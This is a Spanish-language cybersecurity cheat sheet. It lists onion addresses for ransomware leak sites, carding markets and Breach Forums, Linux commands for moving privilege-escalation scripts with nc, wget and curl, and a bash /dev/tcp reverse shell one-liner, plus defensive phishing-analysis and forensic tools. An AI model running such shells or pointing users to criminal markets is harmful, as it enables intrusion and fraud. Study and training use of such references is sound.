# ***I. Dark Web***

## 1.1.Wiki

   - The Hidden Wiki
      ```bash
      http[:]//zqktlwiuavvvqqt4ybvgvi7tyo4hjl5xgfuvpdf6otjiycgwqbym2qad[.]onion/wiki/Main_Page
      ```
   - OnionLinks
      ```bash
      http[:]//jaz45aabn5vkemy4jkg4mi4syheisqn2wn2n4fsuitpccdackjwxplad[.]onion/
      ```

## 1.2.Ransomware Group

   - Ransomware Group Sites
      ```bash
      http[:]//ransomwr3tsydeii4q43vazm7wofla5ujdajquitomtd47cxjtfgwyyd[.]onion/
      ```
   - RansomHub
      ```bash
      http[:]//ransomxifxwc5eteopdobynonjctkxxvap77yqifu2emfbecgbqdw6qd[.]onion//#ShootingHouse
      ```
   - INC Ransom
      ```bash
      incblog7vmuq7rktic73r4ha4j757m3ptym37tyvifzp2roedyyzzxid[.]onion/blog/leaks
      ```
   - Rhysida
      ```bash
      rhysidafohrhyy2aszi7bm32tnjat5xri65fopcxkdfxhi4tidsg7cad[.]onion  / http[:]//rhysidafc6lm7qa2mkiukbezh7zuth3i4wof4mh2audkymscjm6yegad[.]onion/
      ```
   - Lockbit 3 (blog)
      ```bash
      http[:]//lockbit3753ekiocyo5epmpy6klmejchjtzddoekjlnt6mu3qh4de2id[.]onion/
      ```
   - Everest
      ```bash
      http[:]//ransomocmou6mnbquqz44ewosbkjk3o5qjsl3orawojexfook2j7esad[.]onion/
      ```
   - RansomEXX
      ```bash
      http[:]//rnsm777cdsjrsdlbs4v5qoeppu3px6sb2igmh53jzrx7ipcrbjz5b2ad[.]onion/
      ``` 

## 1.3.Otros
   
   - Black Market CC
      ```bash
      http[:]//imjxsmcdedgtljeqip5vmqjepruvlip2xstuos5phwsrp3ka3znzn2ad[.]onion/
      ```
   - CARDS
      ```bash
      http[:]//nalr2uqsave7y2r235am5jsfiklfjh5h4jc5nztu3rzvmhklwt5j6kid[.]onion/list.html
      ```
   Black Hat Chat
      ```bash
      http[:]//blkhatjxlrvc5aevqzz5t6kxldayog6jlx5h7glnu44euzongl4fh5ad[.]onion/
      ```
   Facebook
      ```bash
      http[:]//4wbwa6vcpvcr3vvf4qkhppgy56urmjcj2vagu2iqgp3z656xcmfdbiqd[.]onion/
      ```
   Massive List Onion Service
      ```bash
      http[:]//darknetlidvrsli6iso7my54rjayjursyw637aypb6qambkoepmyq2yd[.]onion/onions
      ```
## 1.4.Breach Forums
   - ```bash
      https://breachforums.st/member.php
      ```
   - ```bash
      breached26tezcofqla4adzyn22notfqwcac7gpbrleg4usehljwkgqd[.]onion
      ```

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# ***II. Linux: Comandos mas usados***

## 2.1. Para trasnferir archivos usando nc

   - Ejecutar en el host donde va a pasar los archivos
      ```bash
      nc -l -p 1234 > LinEnum.sh 
      ```
   - Ejecutar host donde estan los archvios
      ```bash
      cat /home/user/tools/privesc-scripts/LinEnum.sh | nc 10.9.2.251 1234
      ```      
## 2.2. Para trasnferir archivos usando python3 y wget o curl

   - Ejetuar en donde estan los archivos
      ```bash
      python3 -m http.server 8080 
      ```
   - Ejecutar en donde descargar los archivos
      ```bash
      wget http://10.9.2.251:8080/lse.sh -O /home/sn0w/lse.sh
      curl -o /home/sn0w/lse.sh http://10.9.2.251:8080/lse.sh 
      ```
## 2.3. FIND

   - Para buscar archivos
      ```bash
      find -name passwords.txt
      find -name *.txt 
      ```
## 2.4. NETCAT

   - Poner en escucha con netcat
      ```bash
      nc -nlvp 4444 
      ```
## 2.5. REVERSE SHELL TCP

   - Crear una reverse shell TCP
      ```bash
      /bin/bash -c 'bash -i >& /dev/tcp/10.9.2.251/4444 0>&1'
      ```
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# ***III. Tools***

## 3.1. Herramientas Phishing:
Email Header Analyzer - https://mxtoolbox.com/EmailHeaders.aspx
Message Header Analyzer - https://mha.azurewebsites.net/
iplocation.io - https://iplocation.io/
iplocation.net - https://iplocation.net/
IP Geolocation - https://ipinfo.io/products/ip-geolocation-api
CyberChef - https://gchq.github.io/CyberChef/
- From Base64
- From HTML Entity (desofuscar codigo HTML)
- CSS Beautify
- Defang IP Addresses
- Defang URL
Base64Guru: https://base64.guru/
CSS Beautify - https://www.cleancss.com/css-beautify/
JavaScriot Beautifier - https://beautifier.io/
ANY.RUN: https://any.run/
ANY.RUN THEATH INTELLIGENCE Lookup: https://intelligence.any.run/?utm_source=csn&utm_medium=article&utm_campaign=phishing_attacks&utm_content=ti_lookup&utm_term=051224
have i been pwned? - https://haveibeenpwned.com/
PhishTool - https://app.phishtool.com/sign-up/community
VirtusTotal - https://www.virustotal.com/gui/home/upload
Email Reputation - https://emailrep.io/
InQuest Indicator Lookup - https://labs.inquest.net/ (clic en INDICATOR OOKUP)

## 3.2. Malware:
MalwareBazaar - https://bazaar.abuse.ch/browse/

## 3.3. Auditoria de contraseñas:
Specops Password Auditor - https://specopssoft.com/product/specops-password-auditor/
Enzoic Active Directory Lite - https://www.enzoic.com/active-directory-lite/

## 3.4. Forense:
Volatility 3 - https://github.com/volatilityfoundation/volatility3
Autopsy - https://www.autopsy.com/download/
FTK Imager - https://www.exterro.com/digital-forensics-software/ftk-imager

## 3.5. Auditoria a SGBD:
Imperva - Scuba Database Vulnerability Scanner https://www.imperva.com/resources/free-cyber-security-testing-tools/scuba-database-vulnerability-scanner/
Calssifier Impeerva: https://www.imperva.com/resources/free-cyber-security-testing-tools/imperva-classifier-data-classification-tool/





   



